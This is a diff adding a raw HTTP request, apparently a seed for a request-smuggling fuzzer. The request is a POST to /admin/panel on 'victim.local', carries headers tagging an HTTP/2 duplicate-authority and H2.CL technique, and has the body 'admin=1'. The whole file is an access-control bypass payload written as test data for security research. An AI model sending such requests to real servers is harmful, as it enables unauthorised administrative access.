@@ -1,0 +1,16 @@
+POST /admin/panel HTTP/1.1
+Host: victim.local
+X-WF-Request-ID: seedh2auth
+X-WF-Family: h2_dup_authority
+X-WF-Tags: H2.CL,duplicate_semantic_header,authority_ambiguity
+X-WF-Transport: h2_raw
+X-WF-Delivery: h2_raw
+X-WF-Probe: none
+X-WF-Pause-MS: 0
+X-WF-Chunk-Shape: none
+X-WF-H2-Mode: duplicate_authority
+X-WF-H2-End-Stream: normal
+X-WF-Impact: /admin/panel
+Content-Length: 7
+
+admin=1
